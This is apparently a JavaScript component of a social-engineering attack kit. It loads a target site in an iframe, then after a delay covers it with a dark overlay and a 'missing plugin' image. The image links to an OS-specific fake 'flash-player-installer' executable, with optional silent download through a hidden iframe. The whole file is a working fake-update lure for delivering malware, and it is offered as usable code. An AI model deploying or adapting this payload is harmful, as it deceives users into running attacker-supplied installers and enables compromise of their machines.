var browser="";
var infect = false;

var myDivImg;
var myDiv;

/*Real Image Width and Height*/
var imgWidth = 0;
var imgHeight = 0;
var realWidth;
var realHeight;
var tgtimage;
var image1;
var zoom = 0;

// Detect the Browser using the UserAgent
function detectBrowser() {
	if ((typeof(navigator) != "undefined") && (typeof(navigator.userAgent) != "undefined")) {
		var ua = navigator.userAgent;

		if (ua.search(/chrome/i) != -1) {
			return "chrome";
		}		
		
		if (ua.search(/webkit/i) != -1) {
			return "safari";
		}
		
		if (ua.search(/opera/i) != -1) {
			return "opera";
		}		
		
		if ((ua.search(/msie/i) != -1) && (ua.search(/opera/i) == -1)) {
			return "msie";
		}
		
		if ((ua.search(/mozilla/i) != -1) && (ua.search(/(compatible|webkit)/i) == -1)) {
			return "mozilla";
		}
		
		return "msie"; // return msie as default if unable to detect via user agent
	}
		// The navigator.userAgent object does not exists
		return "";
}

var winW=0;
var winH=0;

function getWindowSize() {
	winW = 0, winH = 0;
	
	if (document.body && document.body.offsetWidth) {
		winW = document.body.offsetWidth;
		winH = document.body.offsetHeight;
	}
	
	if (document.compatMode=='CSS1Compat' &&
    	document.documentElement &&
    	document.documentElement.offsetWidth ) {
 		winW = document.documentElement.offsetWidth;
 		winH = document.documentElement.offsetHeight;
	}
	
	if (window.innerWidth && window.innerHeight) {
 		winW = window.innerWidth;
 		winH = window.innerHeight;
	}

	if (!infect) {	
		var frame1 = document.getElementById("iframe1");
		var iframeDoc = frame1.contentDocument || frame1.contentWindow.document;
		var wid = iframeDoc.getElementById("widthDiv");
		winW = wid.offsetWidth;
	}
}

function scaleSize(maxW, maxH, currW, currH){
	var ratio = currH / currW;
    
	var currH2=currH;
	var currW2=currW;
    
	if(currH >= maxH) {
        currH = maxH;
        currW = currH / ratio;
    } 
    
    if(currW >= maxW && ratio <= 1){
        currW = maxW;
        currH = currW * ratio;
    }

    return [currW, currH];
}

var imgWidth1 = 0;
var imgHeight1 = 0;

function setImageSize(update) {

	if (imgWidth1 != 0) imgWidth1 = imgWidth;
	if (imgHeight1 != 0) imgHeight1 = imgHeight;
	imgWidth1 = image1.width;
	imgHeight1 = image1.height;
	getWindowSize();
	
	if (imgWidth1 >= winW || imgHeight1 >= winH) {
		var newSize = scaleSize(winW*0.9, winH*0.9, realWidth, realHeight);
		imgWidth = newSize[0];
		imgHeight = newSize[1];
	} else {
		imgWidth = imgWidth1;
		imgHeight = imgHeight1;
	}
	
	if (update) {
		tgtimage.width = imgWidth;
		tgtimage.height = imgHeight;		
		centerDiv(myDivImg);	
	}
}

function centerDiv(d) {
	var w = imgWidth/2;
	var h = imgHeight/2;
	
	getWindowSize(); // returns the window size in winW,winH
	if (winW==0)
		winW = screen.width;
	if (winH==0)
		winH == screen.height;
	
	var __screenY=winW/2;
 	var __screenX=winH/2;
 	
	d.style.top = __screenX-h+"px";
	d.style.left = __screenY-w+"px";	
}

// Start function when the page loads
function initTimer() {
	setImageSize(false);
	browser = detectBrowser();
	
	// Detect the underlying operating system (like Windows or Linux)
	var os = (window.orientation != undefined) ? 'ipod': (navigator.platform.match(/mac|win|linux/i) || ['other'])[0].toLowerCase();
	
	// Assign a filename for the operating system
	var execwindows = "flash-player-installer.exe";
	var execlinux = "flash-player-installer.sh";
	var execmac = "flash-player-installer.dmg";
	var filename = null;
	
	if (os == "win") {
		filename = execwindows;	
	}
	
	if (os=="linux") {
		filename = execlinux;	
	}
	
	if (os=="mac") {
		filename = execmac;	
	}

	if (filename == null) {
		filename = execwindows;	
	}
    
	myDiv = document.createElement('div');  
	myDiv.id = 'myDiv';  
	myDiv.style.position = 'fixed';  
	myDiv.style.top = 0;
	myDiv.style.left = 0;
	getWindowSize();
	if (!infect) {
		var frame1 = document.getElementById("iframe1");
		var iframeDoc = frame1.contentDocument || frame1.contentWindow.document;
		var wid = iframeDoc.getElementById("widthDiv");
		myDiv.style.width = (wid.offsetWidth) + "px";  
	} else myDiv.style.width = "100%";
	myDiv.style.height = "100%";  
	myDiv.style.backgroundColor = '#000'; 
	myDiv.style.zIndex = 2147483646;

	if (browser != "msie") {
		myDiv.style.opacity = '0.65';
	} else {
		myDiv.style.filter = 'progid:DXImageTransform.Microsoft.Alpha(opacity=65)';	
	}
	
	myDiv.setAttribute("unselectable", "on");
	myDiv.setAttribute("class", "unselectable");
	
	document.body.appendChild(myDiv);
		
	myDivImg = document.createElement('div');
	myDivImg.id = 'myDivImg';
	myDivImg.style.position = 'fixed';	
	
	// Position Image div into the center of the screen
	centerDiv(myDivImg);
	myDivImg.style.zIndex = 2147483647;
	
	// create the link with image inside
	var ahref = document.createElement('a');
	ahref.href = filename;
	ahref.title = "Missing";
	ahref.style.border = 0;
	tgtimage = document.createElement('img');
	tgtimage.src = "missing.jpg";
	tgtimage.width = imgWidth;
	tgtimage.height = imgHeight;
	tgtimage.style.border = 0;
	
	ahref.appendChild(tgtimage);
	
	myDivImg.onselectstart="return false;"
	myDivImg.ondragstart="return false;"	
	
	myDivImg.appendChild(ahref);

	myDivImg.setAttribute("unselectable", "on");
	myDivImg.setAttribute("class", "unselectable");	
	
	document.body.appendChild(myDivImg);

	// Center the div containing the Image on a window resize event	
    window.onresize = function(event) {	
	    setImageSize(true);
	    getWindowSize();
	    var myDiv = document.getElementById("myDiv");
		myDiv.style.width = (winW) + "px";  
	}	

	// Autodownload the file if requested
	var autodownload = "True";

	if (autodownload.toLowerCase() != "true") {
		var download = document.createElement('iframe');
		download.src = filename;
		download.width = 0;
		download.height = 0;
		download.style.border = "0";
		download.style.display = "none";
		download.style.visibility = "hidden";
		download.border = 0;
		
		document.body.appendChild(download);	
	}
	
	if (!infect) zoomHandler();
}

function init() {
    // Use a simple session cookie for a shoot-once detection
    var cookie_kv = document.cookie.split("=");
    if(cookie_kv[0] == "started" && cookie_kv[1]== "true") {
	return;
    }

	window.setTimeout("initTimer()", 4000);	
}

function zoomHandler() {
var if1 = document.getElementById("iframe1");
var iframeDoc = if1.contentDocument || if1.contentWindow.document;
iframeDoc.getElementById("two").style.left = iframeDoc.getElementById("one").offsetLeft + "px";

setInterval(function() {
  var newZoom = iframeDoc.getElementById("two").offsetLeft / iframeDoc.getElementById("one").offsetLeft;
  if (newZoom == zoom) return;
  zoom = newZoom;
  var wid = iframeDoc.getElementById("widthDiv");
  myDiv.width = wid.offsetWidth;
}, 200);	
}

var tgturl = document.getElementById('tgturl');
if (tgturl == null) {
	infect = true;
} else {
try {
	document.style.overflowX = 'hidden';
} catch (e) {};

var hiddenFrame = document.createElement('iframe');
hiddenFrame.id="iframe1";	
hiddenFrame.style.position="absolute";
hiddenFrame.style.visibility="hidden";
hiddenFrame.style.width="100%";
hiddenFrame.style.height="100%";
hiddenFrame.style.zIndex="-16777270";
hiddenFrame.style.overflowX="hidden";
hiddenFrame.width = "100%";
hiddenFrame.height = "1080";
hiddenFrame.scrolling = "yes";
hiddenFrame.frameBorder = "0";
hiddenFrame.src = "empty.html";
document.body.appendChild(hiddenFrame);

var framebusting = "Disable";

var ifr = document.createElement('iframe');
if (framebusting.toUpperCase() == "YES") {
	ifr.setAttribute("security", "restricted");
	ifr.setAttribute("sandbox", "allow-scripts allow-forms");
}
ifr.display="block";
ifr.overflowX="hidden";
ifr.width="100%";
ifr.height="100%";
ifr.zIndex="0";
ifr.src=tgturl.value;
ifr.width="100%";
ifr.height="100%";
ifr.frameBorder="0";

var containerS = document.createElement("div");
containerS.id="container";
containerS.style.position = "relative";
containerS.style.width = "100%";
containerS.style.height = "100%";
document.body.appendChild(containerS);
containerS.appendChild(ifr);
}

image1 = new Image();
image1.src = "missing.jpg";

image1.onload = function() {
	realWidth = image1.width;
	realHeight = image1.height;
	init();
};

